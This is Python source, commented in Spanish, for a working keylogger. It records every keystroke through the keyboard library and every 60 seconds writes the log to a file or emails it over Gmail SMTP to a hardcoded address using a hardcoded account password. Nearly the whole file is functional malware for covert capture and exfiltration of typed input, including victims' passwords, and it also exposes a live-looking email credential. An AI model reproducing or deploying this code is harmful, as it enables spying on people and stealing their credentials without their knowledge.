import keyboard # Registrar las pulsaciones del teclado
import smtplib # Enviar un email con un protocolo smtp
# Librerias de tiempo
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 # Tiempo que enviara en el reporte
EMAIL_ADDRESS = "2016keylog1@gmail.com" #Correo al que se enviara la información
EMAIL_PASSWORD = "zxrzagyhneazhned" #Contraseña del correo

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # Se enviara un reporte por intervalos
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        # Almacenar hora que empieza y termina de grabar
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # modificar el texto cuando tenga caracteres especiales (no letras)
            if name == "space":
                name = " "
            elif name == "enter":
                # Si se presiona enter se debe pasar a la siguiente linea
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        # se debe actualizar el nombre en base al tiempo de recoleccion de datos
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """El metodo creara un nuevo documento en el directorio"""
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """Metodo para enviar la informacion del txt por correo"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Registro"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # Gestionar la información a un servidor SMTP
        #Este variara dependiendo del tipo de correo, se tiene que quitar la seguridad de este
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # conectarse a un servidor a traves del modo TLS por temas de seguridad
        server.starttls()
        # Hacer login 
        server.login(email, password)
        # Enviar el mensaje
        server.sendmail(email, email, self.prepare_mail(message))
        # Salir de la sesión
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):

        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        # iniciar el keylogger
        keyboard.on_release(callback=self.callback)
        # empezar a reportar las pulsaciones
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
